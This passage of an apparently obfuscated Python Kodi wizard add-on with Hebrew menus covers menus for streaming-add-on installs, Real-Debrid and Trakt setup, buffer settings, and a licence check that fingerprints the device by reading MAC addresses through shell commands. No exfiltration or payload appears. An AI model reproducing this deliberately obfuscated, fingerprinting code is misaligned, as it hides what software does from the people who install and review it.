	OO00OOO0O0000O00O .setProperty ("icon_Image",OOOO0OO00OOO00OOO )#line:1641
	O0O00OO00OOOOO0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00O00000000O0O0O ,listitem =OO00OOO0O0000O00O ,isFolder =False )#line:1642
	return O0O00OO00OOOOO0OO #line:1643
def get_params ():#line:1645
		O000000O000OOO00O =[]#line:1646
		O000OOOO00OO0O00O =sys .argv [2 ]#line:1647
		if len (O000OOOO00OO0O00O )>=2 :#line:1648
				O00OOO0000000OOOO =sys .argv [2 ]#line:1649
				O0OOOO0OO00O00OO0 =O00OOO0000000OOOO .replace ('?','')#line:1650
				if (O00OOO0000000OOOO [len (O00OOO0000000OOOO )-1 ]=='/'):#line:1651
						O00OOO0000000OOOO =O00OOO0000000OOOO [0 :len (O00OOO0000000OOOO )-2 ]#line:1652
				O0O000O00O0OO0OOO =O0OOOO0OO00O00OO0 .split ('&')#line:1653
				O000000O000OOO00O ={}#line:1654
				for OOO0OO00OOOOOO0O0 in range (len (O0O000O00O0OO0OOO )):#line:1655
						O0OO0000OO0O0O0O0 ={}#line:1656
						O0OO0000OO0O0O0O0 =O0O000O00O0OO0OOO [OOO0OO00OOOOOO0O0 ].split ('=')#line:1657
						if (len (O0OO0000OO0O0O0O0 ))==2 :#line:1658
								O000000O000OOO00O [O0OO0000OO0O0O0O0 [0 ]]=O0OO0000OO0O0O0O0 [1 ]#line:1659
		return O000000O000OOO00O #line:1661
def decode (OO0O0OOOOOO00O0OO ,O0OOOOO0OOOO000O0 ):#line:1666
    import base64 #line:1667
    O00O0O00O0OO0O0O0 =[]#line:1668
    if (len (OO0O0OOOOOO00O0OO ))!=4 :#line:1670
     return 10 #line:1671
    O0OOOOO0OOOO000O0 =base64 .urlsafe_b64decode (O0OOOOO0OOOO000O0 )#line:1672
    for OO00O0O0OOO0OOO0O in range (len (O0OOOOO0OOOO000O0 )):#line:1674
        OOO0000OO00OOOO0O =OO0O0OOOOOO00O0OO [OO00O0O0OOO0OOO0O %len (OO0O0OOOOOO00O0OO )]#line:1675
        O00O000OOOOOO00OO =chr ((256 +ord (O0OOOOO0OOOO000O0 [OO00O0O0OOO0OOO0O ])-ord (OOO0000OO00OOOO0O ))%256 )#line:1676
        O00O0O00O0OO0O0O0 .append (O00O000OOOOOO00OO )#line:1677
    return "".join (O00O0O00O0OO0O0O0 )#line:1678
def tmdb_list (OOO0O000O00O0OO0O ):#line:1679
    O0O0O0OOO0O0O0OO0 =decode ("7643",OOO0O000O00O0OO0O )#line:1682
    return int (O0O0O0OOO0O0O0OO0 )#line:1685
def u_list (O00O0O00OOO00O000 ):#line:1686
    from math import sqrt #line:1688
    OOOOOO0000000OO0O =tmdb_list (TMDB_NEW_API )#line:1689
    O000OOO0O00OO0000 =str ((getHwAddr ('eth0'))*OOOOOO0000000OO0O )#line:1691
    OOOOOO0O0000OO0O0 =int (O000OOO0O00OO0000 [1 ]+O000OOO0O00OO0000 [2 ]+O000OOO0O00OO0000 [5 ]+O000OOO0O00OO0000 [7 ])#line:1692
    O0O00000O00OOOOO0 =(ADDON .getSetting ("pass"))#line:1694
    OOOO000O0OOO0000O =(str (round (sqrt ((OOOOOO0O0000OO0O0 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1699
    if '.'in OOOO000O0OOO0000O :#line:1700
     OOOO000O0OOO0000O =(str (round (sqrt ((OOOOOO0O0000OO0O0 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1701
    if O0O00000O00OOOOO0 ==OOOO000O0OOO0000O :#line:1703
      O00O000OO000OO00O =O00O0O00OOO00O000 #line:1705
    else :#line:1707
       if STARTP2 ()and STARTP ()=='ok':#line:1708
         return O00O0O00OOO00O000 #line:1711
       O00O000OO000OO00O ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1712
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1713
       sys .exit ()#line:1714
    return O00O000OO000OO00O #line:1715
def disply_hwr ():#line:1718
   try :#line:1719
    O0O000O0OOO0OO00O =tmdb_list (TMDB_NEW_API )#line:1720
    O0OO0O00O00OO0O0O =str ((getHwAddr ('eth0'))*O0O000O0OOO0OO00O )#line:1721
    OO00OO0OO0O00OOO0 =(O0OO0O00O00OO0O0O [1 ]+O0OO0O00O00OO0O0O [2 ]+O0OO0O00O00OO0O0O [5 ]+O0OO0O00O00OO0O0O [7 ])#line:1728
    O00000O0OOO0O00OO =(ADDON .getSetting ("action"))#line:1729
    wiz .setS ('action',str (OO00OO0OO0O00OOO0 ))#line:1731
   except :pass #line:1732
def disply_hwr2 ():#line:1733
   try :#line:1734
    OO0OOO0O0O0OOO00O =tmdb_list (TMDB_NEW_API )#line:1735
    OOOOOOO000000OOOO =str ((getHwAddr ('eth0'))*OO0OOO0O0O0OOO00O )#line:1737
    O00OO00O00OO0000O =(OOOOOOO000000OOOO [1 ]+OOOOOOO000000OOOO [2 ]+OOOOOOO000000OOOO [5 ]+OOOOOOO000000OOOO [7 ])#line:1746
    O0OO00000000OO0OO =(ADDON .getSetting ("action"))#line:1747
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O00OO00O00OO0000O )#line:1750
   except :pass #line:1751
def getHwAddr (O00000OOOOO0OO000 ):#line:1753
   import subprocess ,time #line:1754
   O0O00OO00O0OOO0O0 ='windows'#line:1755
   if xbmc .getCondVisibility ('system.platform.android'):#line:1756
       O0O00OO00O0OOO0O0 ='android'#line:1757
   if xbmc .getCondVisibility ('system.platform.android'):#line:1758
     OO0O0OO0000OOOO00 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1759
     O0OO00OO000OOO0OO =re .compile ('link/ether (.+?) brd').findall (str (OO0O0OO0000OOOO00 ))#line:1761
     O000OO0OO0O0O000O =0 #line:1762
     for OOOO000OOOOOO0OOO in O0OO00OO000OOO0OO :#line:1763
      if O0OO00OO000OOO0OO !='00:00:00:00:00:00':#line:1764
          O0O0OO00OOOO000OO =OOOO000OOOOOO0OOO #line:1765
          O000OO0OO0O0O000O =O000OO0OO0O0O000O +int (O0O0OO00OOOO000OO .replace (':',''),16 )#line:1766
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1768
       OOOO000O0O0O0OO00 =0 #line:1769
       O000OO0OO0O0O000O =0 #line:1770
       O00OO000OOO00O00O =[]#line:1771
       O00O0O0000OO0O0O0 =os .popen ("getmac").read ()#line:1772
       O00O0O0000OO0O0O0 =O00O0O0000OO0O0O0 .split ("\n")#line:1773
       for OO0OO00OO0OO00O0O in O00O0O0000OO0O0O0 :#line:1775
            O00O00O00OOOO0OOO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO0OO00OO0OO00O0O ,re .I )#line:1776
            if O00O00O00OOOO0OOO :#line:1777
                O0OO00OO000OOO0OO =O00O00O00OOOO0OOO .group ().replace ('-',':')#line:1778
                O00OO000OOO00O00O .append (O0OO00OO000OOO0OO )#line:1779
                O000OO0OO0O0O000O =O000OO0OO0O0O000O +int (O0OO00OO000OOO0OO .replace (':',''),16 )#line:1782
   else :#line:1784
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1785
   try :#line:1802
    return O000OO0OO0O0O000O #line:1803
   except :pass #line:1804
def getpass ():#line:1805
	disply_hwr2 ()#line:1807
def setpass ():#line:1808
    O00OO0O0000OO000O =xbmcgui .Dialog ()#line:1809
    O0OOO0OOO00O00000 =''#line:1810
    O00000OOOOOO000OO =xbmc .Keyboard (O0OOO0OOO00O00000 ,'הכנס סיסמה')#line:1812
    O00000OOOOOO000OO .doModal ()#line:1813
    if O00000OOOOOO000OO .isConfirmed ():#line:1814
           O00000OOOOOO000OO =O00000OOOOOO000OO .getText ()#line:1815
    wiz .setS ('pass',str (O00000OOOOOO000OO ))#line:1816
def setuname ():#line:1817
    O0O0000OO00O0OOOO =''#line:1818
    OO0OO00O0OOO000O0 =xbmc .Keyboard (O0O0000OO00O0OOOO ,'הכנס שם משתמש')#line:1819
    OO0OO00O0OOO000O0 .doModal ()#line:1820
    if OO0OO00O0OOO000O0 .isConfirmed ():#line:1821
           O0O0000OO00O0OOOO =OO0OO00O0OOO000O0 .getText ()#line:1822
           wiz .setS ('user',str (O0O0000OO00O0OOOO ))#line:1823
def powerkodi ():#line:1824
    os ._exit (1 )#line:1825
def buffer1 ():#line:1827
	OOOO0O0O00O0O00OO =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1828
	OO0OO0O0O0O0OO0O0 =xbmc .getInfoLabel ("System.Memory(total)")#line:1829
	O00O00000OOO0O000 =xbmc .getInfoLabel ("System.FreeMemory")#line:1830
	O00OOOO0000OO0O0O =re .sub ('[^0-9]','',O00O00000OOO0O000 )#line:1831
	O00OOOO0000OO0O0O =int (O00OOOO0000OO0O0O )/3 #line:1832
	OOO00O0OO0OOOO000 =O00OOOO0000OO0O0O *1024 *1024 #line:1833
	try :O0O00OO0000OOOOO0 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1834
	except :O0O00OO0000OOOOO0 =16 #line:1835
	O0OO0O0O00OOOO0O0 =DIALOG .yesno ('FREE MEMORY: '+str (O00O00000OOO0O000 ),'Based on your free Memory your optimal buffersize is: '+str (O00OOOO0000OO0O0O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1838
	if O0OO0O0O00OOOO0O0 ==1 :#line:1839
		with open (OOOO0O0O00O0O00OO ,"w")as O000O0000O00OO0OO :#line:1840
			if O0O00OO0000OOOOO0 >=17 :OO00O0O000O0OO0O0 =xml_data_advSettings_New (str (OOO00O0OO0OOOO000 ))#line:1841
			else :OO00O0O000O0OO0O0 =xml_data_advSettings_old (str (OOO00O0OO0OOOO000 ))#line:1842
			O000O0000O00OO0OO .write (OO00O0O000O0OO0O0 )#line:1844
			DIALOG .ok ('Buffer Size Set to: '+str (OOO00O0OO0OOOO000 ),'Please restart Kodi for settings to apply.','')#line:1845
	elif O0OO0O0O00OOOO0O0 ==0 :#line:1847
		OOO00O0OO0OOOO000 =_O0O0000OOOO000O0O (default =str (OOO00O0OO0OOOO000 ),heading ="INPUT BUFFER SIZE")#line:1848
		with open (OOOO0O0O00O0O00OO ,"w")as O000O0000O00OO0OO :#line:1849
			if O0O00OO0000OOOOO0 >=17 :OO00O0O000O0OO0O0 =xml_data_advSettings_New (str (OOO00O0OO0OOOO000 ))#line:1850
			else :OO00O0O000O0OO0O0 =xml_data_advSettings_old (str (OOO00O0OO0OOOO000 ))#line:1851
			O000O0000O00OO0OO .write (OO00O0O000O0OO0O0 )#line:1852
			DIALOG .ok ('Buffer Size Set to: '+str (OOO00O0OO0OOOO000 ),'Please restart Kodi for settings to apply.','')#line:1853
def xml_data_advSettings_old (OO0OO000O0OO000OO ):#line:1854
	O000OOOO0O0OOOOOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO0OO000O0OO000OO #line:1864
	return O000OOOO0O0OOOOOO #line:1865
def xml_data_advSettings_New (OOO0000000O0OOO00 ):#line:1867
	O0O00OO000O0OOOO0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OOO0000000O0OOO00 #line:1879
	return O0O00OO000O0OOOO0 #line:1880
def write_ADV_SETTINGS_XML (O00OO00OOO0O00OOO ):#line:1881
    if not os .path .exists (xml_file ):#line:1882
        with open (xml_file ,"w")as O0000O00O00OOO00O :#line:1883
            O0000O00O00OOO00O .write (xml_data )#line:1884
def _O0O0000OOOO000O0O (default ="",heading ="",hidden =False ):#line:1885
    ""#line:1886
    O00OO0O0O00OO0O0O =xbmc .Keyboard (default ,heading ,hidden )#line:1887
    O00OO0O0O00OO0O0O .doModal ()#line:1888
    if (O00OO0O0O00OO0O0O .isConfirmed ()):#line:1889
        return unicode (O00OO0O0O00OO0O0O .getText (),"utf-8")#line:1890
    return default #line:1891
def index ():#line:1893
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1894
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1895
	if AUTOUPDATE =='Yes':#line:1896
		if wiz .workingURL (WIZARDFILE )==True :#line:1897
			O00OO0O0O0OO0O000 =wiz .checkWizard ('version')#line:1898
			if O00OO0O0O0OO0O000 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O00OO0O0O0OO0O000 ),'wizardupdate',themeit =THEME2 )#line:1899
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1900
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1901
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1902
	if len (BUILDNAME )>0 :#line:1903
		OO0000OOOO0O00OOO =wiz .checkBuild (BUILDNAME ,'version')#line:1904
		O0O0OOO0O0OO0OO0O ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:1905
		if OO0000OOOO0O00OOO >BUILDVERSION :O0O0OOO0O0OO0OO0O ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0O0OOO0O0OO0OO0O ,OO0000OOOO0O00OOO )#line:1906
		addDir (O0O0OOO0O0OO0OO0O ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:1908
		try :#line:1910
		     OO00O00OOOOOOO000 =wiz .themeCount (BUILDNAME )#line:1911
		except :#line:1912
		   OO00O00OOOOOOO000 =False #line:1913
		if not OO00O00OOOOOOO000 ==False :#line:1914
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:1915
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:1916
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1919
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1920
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1921
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1925
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1927
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1929
def morsetup ():#line:1931
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1932
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1933
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:1934
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:1935
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1936
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1940
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1941
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1944
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1945
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1955
	setView ('files','viewType')#line:1956
def morsetup2 ():#line:1957
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1958
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1959
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1960
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1961
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1962
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1963
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1964
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1965
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1966
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1967
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1968
def fastupdate ():#line:1969
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:1970
def forcefastupdate ():#line:1972
			OOO00OO0000000000 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1973
			wiz .ForceFastUpDate (ADDONTITLE ,OOO00OO0000000000 )#line:1974
def rdsetup ():#line:1978
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:1979
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:1980
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:1982
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1983
def traktsetup ():#line:1986
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1987
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1988
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1989
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1990
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1991
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1992
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1993
	setView ('files','viewType')#line:1994
def setautorealdebrid ():#line:1995
    from resources .libs import real_debrid #line:1996
    OOOO0O0OO0OO00OOO =real_debrid .RealDebridFirst ()#line:1997
    OOOO0O0OO0OO00OOO .auth ()#line:1998
def setrealdebrid ():#line:2000
    from resources .libs import real_debrid #line:2001
    OO0000000OOOOOOOO =real_debrid .RealDebrid ()#line:2002
    OO0000000OOOOOOOO .auth ()#line:2003
    OO0000000OOOOOOOO =real_debrid .RealDebrid ()#line:2004
    O0OO0OO0000O0000O =(OO0000000OOOOOOOO .getRelevantHosters ())#line:2005
    rdon ()#line:2006
def resolveurlsetup ():#line:2008
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2009
def urlresolversetup ():#line:2010
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2011
def placentasetup ():#line:2013
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2014
def reptiliasetup ():#line:2015
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2016
def flixnetsetup ():#line:2017
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2018
def yodasetup ():#line:2019
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2020
def numberssetup ():#line:2021
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2022
def uranussetup ():#line:2023
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2024
def genesissetup ():#line:2025
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2026
def net_tools (view =None ):#line:2028
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2029
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2030
	setView ('files','viewType')#line:2032
def speedMenu ():#line:2033
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2034
def viewIP ():#line:2035
	O0OOO00O0O000O00O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2049
	O000OO0O00O00000O =[];O000O0O0O00O0OOOO =0 #line:2050
	for OOO0O000OO0OOOOO0 in O0OOO00O0O000O00O :#line:2051
		O00O0O000O0OO00O0 =wiz .getInfo (OOO0O000OO0OOOOO0 )#line:2052
		OOOOO0OO00OO0O00O =0 #line:2053
		while O00O0O000O0OO00O0 =="Busy"and OOOOO0OO00OO0O00O <10 :#line:2054
			O00O0O000O0OO00O0 =wiz .getInfo (OOO0O000OO0OOOOO0 );OOOOO0OO00OO0O00O +=1 ;wiz .log ("%s sleep %s"%(OOO0O000OO0OOOOO0 ,str (OOOOO0OO00OO0O00O )));xbmc .sleep (1000 )#line:2055
		O000OO0O00O00000O .append (O00O0O000O0OO00O0 )#line:2056
		O000O0O0O00O0OOOO +=1 #line:2057
	OOO000OOOOOO0O0O0 ,OO000O0000O000OO0 ,O000O00OO00O0O000 =getIP ()#line:2058
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OO0O00O00000O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2059
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO000OOOOOO0O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2060
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O0000O000OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2061
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OO00O0O000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2062
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OO0O00O00000O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2063
	setView ('files','viewType')#line:2064
def buildMenu ():#line:2066
	if USERNAME =='':#line:2067
		ADDON .openSettings ()#line:2068
		sys .exit ()#line:2069
	if PASSWORD =='':#line:2070
		ADDON .openSettings ()#line:2071
	OOO00OOOO0OOOOO0O =u_list (SPEEDFILE )#line:2072
	(OOO00OOOO0OOOOO0O )#line:2073
	O0O00OOO0000OOO00 =(wiz .workingURL (OOO00OOOO0OOOOO0O ))#line:2074
	(O0O00OOO0000OOO00 )#line:2075
	O0O00OOO0000OOO00 =wiz .workingURL (SPEEDFILE )#line:2076
	if not O0O00OOO0000OOO00 ==True :#line:2077
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2078
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2079
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2080
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2081
		addFile ('%s'%O0O00OOO0000OOO00 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2082
	else :#line:2083
		OOOO0OOOOO0OOOOOO ,OOOO00000O000O0OO ,O00OO0OO0OOOOO0O0 ,OOOOOOO000OOO000O ,OOO00OO00O000O00O ,OO0O0000O000000OO ,O0OOOO0O0OOO0O000 =wiz .buildCount ()#line:2084
		O0OOOOO00O0OO0OO0 =False ;O0O00O00O0O0O0000 =[]#line:2085
		if THIRDPARTY =='true':#line:2086
			if not THIRD1NAME ==''and not THIRD1URL =='':O0OOOOO00O0OO0OO0 =True ;O0O00O00O0O0O0000 .append ('1')#line:2087
			if not THIRD2NAME ==''and not THIRD2URL =='':O0OOOOO00O0OO0OO0 =True ;O0O00O00O0O0O0000 .append ('2')#line:2088
			if not THIRD3NAME ==''and not THIRD3URL =='':O0OOOOO00O0OO0OO0 =True ;O0O00O00O0O0O0000 .append ('3')#line:2089
		OOO0O00OO0O0000O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2090
		OOOOOO00O0O0O0O00 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO0O00OO0O0000O0 )#line:2091
		if OOOO0OOOOO0OOOOOO ==1 and O0OOOOO00O0OO0OO0 ==False :#line:2092
			for OOOOOO0OOO0O0OOO0 ,OOO0O0OO0O000OO0O ,O0O0O00OO000O0000 ,O0OOO0OOO00000OOO ,OO00OOOOO000000O0 ,O0O0OOOO00000OO00 ,OOOOO0O000O000OO0 ,O00OOO00OOO00OO00 ,O000OOOO000OOO0O0 ,O00000OOO0O0O00O0 in OOOOOO00O0O0O0O00 :#line:2093
				if not SHOWADULT =='true'and O000OOOO000OOO0O0 .lower ()=='yes':continue #line:2094
				if not DEVELOPER =='true'and wiz .strTest (OOOOOO0OOO0O0OOO0 ):continue #line:2095
				viewBuild (OOOOOO00O0O0O0O00 [0 ][0 ])#line:2096
				return #line:2097
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2100
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2101
		if O0OOOOO00O0OO0OO0 ==True :#line:2102
			for O000OO0OOOOO000OO in O0O00O00O0O0O0000 :#line:2103
				OOOOOO0OOO0O0OOO0 =eval ('THIRD%sNAME'%O000OO0OOOOO000OO )#line:2104
		if len (OOOOOO00O0O0O0O00 )>=1 :#line:2106
			if SEPERATE =='true':#line:2107
				for OOOOOO0OOO0O0OOO0 ,OOO0O0OO0O000OO0O ,O0O0O00OO000O0000 ,O0OOO0OOO00000OOO ,OO00OOOOO000000O0 ,O0O0OOOO00000OO00 ,OOOOO0O000O000OO0 ,O00OOO00OOO00OO00 ,O000OOOO000OOO0O0 ,O00000OOO0O0O00O0 in OOOOOO00O0O0O0O00 :#line:2108
					if not SHOWADULT =='true'and O000OOOO000OOO0O0 .lower ()=='yes':continue #line:2109
					if not DEVELOPER =='true'and wiz .strTest (OOOOOO0OOO0O0OOO0 ):continue #line:2110
					OO0000OO0000OOOO0 =createMenu ('install','',OOOOOO0OOO0O0OOO0 )#line:2111
					addDir ('[%s] %s (v%s)'%(float (OO00OOOOO000000O0 ),OOOOOO0OOO0O0OOO0 ,OOO0O0OO0O000OO0O ),'viewbuild',OOOOOO0OOO0O0OOO0 ,description =O00000OOO0O0O00O0 ,fanart =O00OOO00OOO00OO00 ,icon =OOOOO0O000O000OO0 ,menu =OO0000OO0000OOOO0 ,themeit =THEME2 )#line:2112
			else :#line:2113
				if OOOOOOO000OOO000O >0 :#line:2114
					O00OO00OO0000O00O ='+'if SHOW17 =='false'else '-'#line:2115
					if SHOW17 =='true':#line:2117
						for OOOOOO0OOO0O0OOO0 ,OOO0O0OO0O000OO0O ,O0O0O00OO000O0000 ,O0OOO0OOO00000OOO ,OO00OOOOO000000O0 ,O0O0OOOO00000OO00 ,OOOOO0O000O000OO0 ,O00OOO00OOO00OO00 ,O000OOOO000OOO0O0 ,O00000OOO0O0O00O0 in OOOOOO00O0O0O0O00 :#line:2119
							if not SHOWADULT =='true'and O000OOOO000OOO0O0 .lower ()=='yes':continue #line:2120
